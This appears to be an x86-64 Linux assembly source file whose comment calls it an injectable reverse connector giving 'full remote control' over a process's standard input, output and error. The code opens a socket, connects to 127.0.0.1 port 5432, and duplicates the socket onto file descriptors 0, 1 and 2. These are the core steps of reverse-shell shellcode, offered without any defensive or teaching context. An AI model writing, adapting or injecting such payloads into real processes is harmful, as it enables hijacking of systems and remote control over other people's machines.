##
#  This is a reverse "thing-a-ma-bob". Basically whatever you inject
#  it into will give you full remote control over stdin/stdout/stderr
#  connects to 127.0.0.1:5432 when executed

    .text

.global _start

_start:
    push %rbp
    mov %rsp, %rbp

    push %rax
    push %rdi
    push %rsi
    push %rdx

    call socket
    mov %rax, %rdi
    # save fd for later
    push %rax
    call connect
    # get the fd for passing
    pop %rdi
    call duplicate

    pop %rdx
    pop %rsi
    pop %rdi
    pop %rax
    pop %rbp

    ret

socket:
    xor %rax, %rax
    xor %rdi, %rdi
    xor %rsi, %rsi
    xor %rdx, %rdx

    # sys_socket = 41
    movb $0x29, %al
    # AF_INET = 2
    movb $0x02, %dil
    # SOCK_STREAM = 1
    movb $0x01, %sil
    # proto = 0
    xor %rdx, %rdx

    syscall

    ret

connect:
    push %rbp
    mov %rsp, %rbp

    push %r8

    # rdi is already set to the file descriptor
    xor %rax, %rax
    xor %rsi, %rsi
    xor %rdx, %rdx
    xor %r8, %r8
   
    # sys_connect = 42
    movb $0x2a, %al

    mov %rsp, %r8
    sub $0x10, %r8

    # zero struct sockaddr
    push %rdx
    push %rdx

    # address = 127.0.0.1
    movl $0x0100007f, 0x04(%r8)
    
    #port = 5432
    movw $0x3815, 0x02(%r8)
    
    # family = AF_INET
    movw $0x0002, 0x00(%r8)
    
    # struct sockaddr *uservaddr
    mov %rsp, %rsi
    # addrlen
    movb $0x10, %dl

    syscall

    add $0x10, %rsp
    
    pop %r8
    pop %rbp
    ret

duplicate:
    # rdi is the fd
    push %rbp
    mov %rsp, %rbp
    
    xor %rax, %rax
    xor %rsi, %rsi

    movb $0x21, %al
    syscall

    xor %rax, %rax
    movb $0x21, %al

    movb $0x01, %sil
    syscall

    xor %rax, %rax
    movb $0x21, %al

    movb $0x02, %sil
    syscall

    pop %rbp

    ret
